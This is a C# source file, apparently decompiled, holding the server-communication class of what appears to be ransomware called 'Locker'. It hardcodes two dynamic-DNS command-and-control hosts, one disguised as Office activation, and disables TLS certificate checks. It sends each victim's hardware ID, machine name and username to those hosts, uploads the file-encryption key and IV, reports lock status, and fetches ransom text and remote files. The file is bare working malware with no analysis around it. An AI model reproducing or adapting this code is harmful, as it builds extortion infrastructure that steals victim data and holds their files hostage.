using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Web;

namespace Locker;

internal class Server
{
	private string[] host = new string[2] { "http://activateoffice.3utilities.com/", "http://lockerbackup.no-ip.org/" };

	private EncryptionKey key;

	public Server()
	{
		ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
		fixNOIPhosts();
	}

	public NameValueCollection GetStatus()
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("hwid", FingerPrint.Value());
		nameValueCollection.Add("func", "status");
		nameValueCollection.Add("computer", Environment.MachineName);
		nameValueCollection.Add("username", Environment.UserName);
		NameValueCollection result = new NameValueCollection();
		string webResponse = getWebResponse(nameValueCollection);
		if (webResponse != "down" && webResponse != string.Empty)
		{
			result = HttpUtility.ParseQueryString(webResponse);
		}
		return result;
	}

	public EncryptionKey GetKey()
	{
		if (key == null)
		{
			NameValueCollection status = GetStatus();
			if (status["key"] != null && status["key"] != string.Empty)
			{
				key = new EncryptionKey(status["key"], status["iv"]);
			}
		}
		return key;
	}

	public bool SetKey(EncryptionKey key)
	{
		this.key = key;
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("hwid", FingerPrint.Value());
		nameValueCollection.Add("func", "setkey");
		nameValueCollection.Add("key", key.Key);
		nameValueCollection.Add("iv", key.Iv);
		string webResponse = getWebResponse(nameValueCollection);
		if (!(webResponse == "OK"))
		{
			return false;
		}
		return true;
	}

	public void DisposeKey()
	{
		key = null;
	}

	public bool Lock()
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("hwid", FingerPrint.Value());
		nameValueCollection.Add("func", "lock");
		string webResponse = getWebResponse(nameValueCollection);
		if (!(webResponse == "OK"))
		{
			return false;
		}
		return true;
	}

	public string GetServerMainText()
	{
		return getWebFileContent("tmp.dat");
	}

	private void fixNOIPhosts()
	{
		for (int i = 0; i < host.Length; i++)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(host[i]);
				httpWebRequest.AllowAutoRedirect = false;
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				host[i] = httpWebResponse.Headers["Location"];
				httpWebResponse.Close();
			}
			catch (Exception)
			{
				i--;
			}
		}
	}

	public int DownloadFile(string remoteFilename, string localFilename)
	{
		if (File.Exists(localFilename))
		{
			try
			{
				File.Delete(localFilename);
			}
			catch (Exception)
			{
			}
		}
		int num = 0;
		Stream stream = null;
		Stream stream2 = null;
		WebResponse webResponse = null;
		int num2 = 0;
		while (!File.Exists(localFilename) && num2 < host.Length)
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(host[num2] + remoteFilename);
				if (webRequest == null)
				{
					continue;
				}
				webResponse = webRequest.GetResponse();
				if (webResponse != null)
				{
					stream = webResponse.GetResponseStream();
					stream2 = File.Create(localFilename);
					byte[] array = new byte[1024];
					int num3;
					do
					{
						num3 = stream.Read(array, 0, array.Length);
						stream2.Write(array, 0, num3);
						num += num3;
					}
					while (num3 > 0);
				}
			}
			catch (Exception)
			{
				num2++;
			}
			finally
			{
				webResponse?.Close();
				stream?.Close();
				stream2?.Close();
			}
		}
		return num;
	}

	private string getWebFileContent(string url)
	{
		string text = string.Empty;
		int num = 0;
		while (text == string.Empty && num < host.Length)
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(host[num] + url);
				webRequest.Method = "GET";
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				text = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				response.Close();
			}
			catch (WebException)
			{
				text = string.Empty;
				num++;
			}
		}
		return text;
	}

	private string getWebResponse(NameValueCollection pairs)
	{
		string text = string.Empty;
		int num = 0;
		while (text == string.Empty && num < host.Length)
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(host[num]);
				webRequest.Method = "POST";
				StringBuilder stringBuilder = new StringBuilder();
				foreach (string key in pairs.Keys)
				{
					stringBuilder.AppendFormat("{0}={1}&", HttpUtility.UrlEncode(key, Encoding.Default), HttpUtility.UrlEncode(pairs[key], Encoding.Default));
				}
				stringBuilder.Length--;
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = stringBuilder.Length;
				using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
				{
					streamWriter.Write(stringBuilder.ToString());
				}
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				text = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				response.Close();
			}
			catch (WebException)
			{
				text = string.Empty;
				num++;
			}
		}
		return text;
	}
}
